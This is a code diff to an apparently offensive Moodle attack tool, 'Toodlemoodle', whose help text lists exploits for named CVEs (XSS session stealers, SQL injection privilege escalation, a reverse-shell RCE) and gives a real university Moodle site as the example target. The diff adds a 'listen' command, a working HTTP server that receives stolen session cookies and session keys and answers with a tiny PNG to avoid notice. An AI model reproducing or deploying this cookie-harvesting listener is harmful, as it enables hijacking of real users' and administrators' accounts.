@@ -3,6 +3,7 @@ require "http/client"
 require "option_parser"
 require "json"
 require "base64"
+require "http/server"
 require "./actions/*"
 
 module Toodlemoodle
@@ -24,7 +25,8 @@ module Toodlemoodle
                         "dashboard_xss -- Inserts a session stealer on to your dashboard for the Admin hijack CVE-2019-3847.\n" \
                         "assignment_xss -- Specially crafted URLs to steal sessions using CVE-2017-2578.\n" \
                         "sql_injection -- Exploits CVE-2017-2641 to escalate a user's privelege.\n" \
-                        "rce_shell -- Exploits CVE-2018-1133 (must be a teacher) to launch a reverse shell.\n"
+                        "rce_shell -- Exploits CVE-2018-1133 (must be a teacher) to launch a reverse shell.\n" \
+                        "listen -- Listen for cookies\n"
         parser.separator("\nArguments:")
         parser.on("-t TARGET", "--target=TARGET", "Moodle target to attack. Do not include a slash at the end! Example: https://ole.unibz.it ") do |str|
           @target = str
@@ -70,6 +72,22 @@ module Toodlemoodle
         sql_injection.perform(@target)
       when "rce_shell"
         # TODO: Riccardo
+      when "listen"
+        server = HTTP::Server.new do |context|
+          context.response.content_type = "image/png;base64"
+          if context.request.query_params["session"]?
+            session = context.request.query_params["session"].not_nil!
+            split = session.split('|').not_nil!
+            puts "Cookie: " + split[0]
+            puts "Moodle Sess key: " + split[1]
+          end
+          puts "Received request " + context.request.path
+          context.response.print "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
+        end
+
+        address = server.bind_tcp 8080
+        puts "Listening on http://#{address}"
+        server.listen
       else
         STDERR.puts "ERROR: Command \"#{@command}\" given does not exist.\n"
         # STDERR.puts @parser
